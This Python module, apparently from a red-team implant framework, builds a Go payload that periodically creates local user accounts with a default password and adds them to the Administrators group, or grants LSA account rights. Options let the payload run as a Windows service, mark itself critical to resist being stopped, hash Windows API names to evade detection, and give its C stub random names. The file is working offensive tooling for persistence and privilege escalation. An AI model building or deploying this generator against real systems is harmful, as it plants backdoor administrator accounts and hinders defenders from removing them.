#!/usr/bin/python3
# Copyright (C) 2020 - 2023 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from os.path import join
from include.util import nes
from include.builder import random_chars
from argparse import BooleanOptionalAction
from include.manager import Manager, is_str, is_int

_HELP_TEXT = """ Generates a UserAdd build based on the supplied profile and behavior
 arguments.

 Arguments
   UserAdd Specific Arguments
   -p                 <period(secs)>  Specify the time period (in seconds) that this
   --period                             UserAdd service will wait before triggering
                                        another creation cycle. This value cannot be
                                        zero. It is recommended to set this value to
                                        be higher than 5 seconds.
   --flag             <file_path>     Specify an optional on-target file path that will
                                        indicate that the service should start creating
                                        users. If not submitted, this will start creation
                                        on service start.

   UserAdd Created User Arguments
   --user             <username>      Specify the username to be used as the "loginname".
                                        This is the value that will be prefixed with
                                        "_<number>" and can be used to login with. If
                                        not specified, this defaults to "JohnCena"
   --password         <password>      Specify the password to be used for logging into
                                        the created accounts. If not specified, this
                                        defaults to "Password1".
   --fullname         <full_name>     Specify the Full Name (Display Name) of the
                                        created users. This value does not change per
                                        user. If not specified, this defaults to
                                        "John Cena".
   --comment          <user_comment>  Specify the user comment of the created users.
                                        This is empty if not specified.
   --group            <admin_gropup>  Specify the name of the Group to add the newly
                                        created user accounts. This defaults to
                                        "Administrators" if not specified.

  Behavior Arguments
   -S                                 Enable the Bolt to be built into a Service/Daemon
   --service                            build. On Windows, it must be launched via SCM.
                                        This does not take any effect on non-Windows
                                        devices.
   -P                                 Use the permissions build template instead of the
   --permissions                        user_add template. Only avaliable on Windows.
   -A                 <service_name>  Specify the name of the Service to be used when
   --service-name                       running as a Service. This has no effect when
                                        not running as a Service and realistically only
                                        has a purpose when running as a Service DLL on
                                        Windows.
   -K                                 Enable or disable the ability for this build to
   --critical                           mark itself as "Critical" which makes it harder
                                        to be stopped by users or solutions. This only
                                        takes effect on Windows devices when ran with
                                        administrative privileges.

  CGO Build Arguments
   -T                 <thread_name>   Supply the thread name to be used in the
   --thread                             generated C stub file.
   -F                 <function_name> Supply the function name to be used in the
   --func                               generated C stub file.
"""


class UserAdd(object):
    __slots__ = ("_m",)

    def __init__(self):
        self._m = Manager("user_add")

    def args_help(self):
        return _HELP_TEXT

    def check(self, cfg):
        self._m.verify(cfg)

    def config_load(self, cfg):
        # UserAdd Options
        self._m.add("flag", ("--flag",), "", is_str(True), str)
        self._m.add("period", ("-p", "--period"), 30, is_int(1), int)
        self._m.add("user_comment", ("--comment",), "", is_str(True), str)
        self._m.add("user_name", ("--user",), "JohnCena", is_str(False), str)
        self._m.add("user_pass", ("--password",), "Password1", is_str(False), str)
        self._m.add("user_fullname", ("--fullname",), "John Cena", is_str(True), str)
        self._m.add("admin_group", ("--group",), "Administrators", is_str(False), str)
        # Behavior/Type Options
        self._m.add("service_name", ("-A", "--service-name"), "", is_str(True), str)
        self._m.add("service", ("-S", "--service"), False, action=BooleanOptionalAction)
        self._m.add(
            "permissions", ("-P", "--permission"), False, action=BooleanOptionalAction
        )
        self._m.add(
            "critical", ("-K", "--critical"), False, action=BooleanOptionalAction
        )
        # CGO Build Options
        self._m.add("func", ("-F", "--func"), "", is_str(True, ft=True), str)
        self._m.add("thread", ("-T", "--thread"), "", is_str(True, ft=True), str)
        self._m.init(cfg)

    def args_pre(self, parser):
        self._m.prep(parser)

    def args_post(self, cfg, args):
        self._m.parse(cfg, args)

    def print_options(self, cfg, root, file):
        if cfg["permissions"]:
            print("- | UserPerms Generator", file=file)
        else:
            print("- | UserAdd Generator", file=file)
        print(f'- | = {"User Name:":20}{cfg["user_name"]}', file=file)
        print(f'- | = {"Password:":20}{cfg["user_pass"]}', file=file)
        print(f'- | = {"Full Name:":20}{cfg["user_fullname"]}', file=file)
        print(f'- | = {"Comment:":20}{cfg["user_comment"]}', file=file)
        print(f'- | = {"Admin Group:":20}{cfg["admin_group"]}', file=file)
        print(f'- | = {"Creation Period:":20}{cfg["period"]}', file=file)
        if nes(cfg["flag"]):
            print(f'- | = {"Flag File:":20}{cfg["flag"]}', file=file)
        print(f'- | = {"Critical:":20}{cfg["critical"]}', file=file)
        print(f'- | = {"Service:":20}{cfg["service"]}', file=file)
        if cfg["service"]:
            print(f'- | = {"Service Name:":20}{cfg["service_name"]}', file=file)
        if not root.get_option("cgo"):
            return
        if nes(cfg["thread"]):
            print(f'- | = {"CGO Thread:":20}{cfg["thread"]}', file=file)
        else:
            print(f'- | = {"CGO Thread:":20}[random]', file=file)
        if nes(cfg["func"]):
            print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
        else:
            print(f'- | = {"CGO Func:":20}[random]', file=file)

    def run(self, cfg, base, workspace, templates):
        p = join(base, "bolt.go")
        w = cfg["period"]
        if not isinstance(w, int) or w <= 0:
            w = 30
        n = cfg["user_fullname"]
        if not nes(n):
            n = cfg["user_name"]
        t = "user_add.go"
        if cfg["permissions"]:
            t = "_user_perms.go"
        k = dict()
        # Replace strings with FNV if crypt or altload is enabled.
        if "crypt" in workspace["tags"] or "altload" in workspace["tags"]:
            k["net_user_add"] = "0x430D5B4C"
            k["net_user_set_into"] = "0x2949C05D"
            k["net_local_group_add_members"] = "0x68333972"
            k["lsa_close"] = "0xB9C1C829"
            k["lsa_free_memory"] = "0x421886E4"
            k["lsa_open_policy"] = "0x34D221F9"
            k["lookup_account_name"] = "0x771AC4CC"
            k["lsa_add_account_rights"] = "0x7E15F444"
            k["lsa_remove_account_rights"] = "0x84CCD465"
        else:
            k["net_user_add"] = "`NetUserAdd`"
            k["net_user_set_into"] = "`NetUserSetInfo`"
            k["net_local_group_add_members"] = "`NetLocalGroupAddMembers`"
            k["lsa_close"] = "`LsaClose`"
            k["lsa_free_memory"] = "`LsaFreeMemory`"
            k["lsa_open_policy"] = "`LsaOpenPolicy`"
            k["lookup_account_name"] = "`LookupAccountNameW`"
            k["lsa_add_account_rights"] = "`LsaAddAccountRights`"
            k["lsa_remove_account_rights"] = "`LsaRemoveAccountRights`"
        with open(p, "w") as f:
            f.write(
                templates[t].substitute(
                    fullname=n,
                    period=str(w),
                    flag=cfg["flag"],
                    admin=cfg["admin_group"],
                    password=cfg["user_pass"],
                    comment=cfg["user_comment"],
                    service=cfg["service_name"],
                    username=f'{cfg["user_name"]}{"" if cfg["permissions"] else "_"}',
                    critical=(
                        "true"
                        if cfg["critical"] and not workspace["library"]
                        else "false"
                    ),
                    **k,
                )
            )
        del w, n, t, k
        return p

    def run_cgo(self, export, cfg, base, workspace, templates):
        t = "bolt.c"
        if workspace["library"]:
            t = "bolt_dll_service.c"
        n, f = cfg["thread"], cfg["func"]
        if not nes(n):
            n = random_chars(12)
        if not nes(f):
            f = random_chars(12)
        d = templates[t].substitute(
            thread=n, export=export, funcname=f, secondary=workspace["secondary"]
        )
        del t, n, f
        p = join(base, "entry.c")
        with open(p, "w") as f:
            f.write(d)
        del d
        return (p, "bolt")
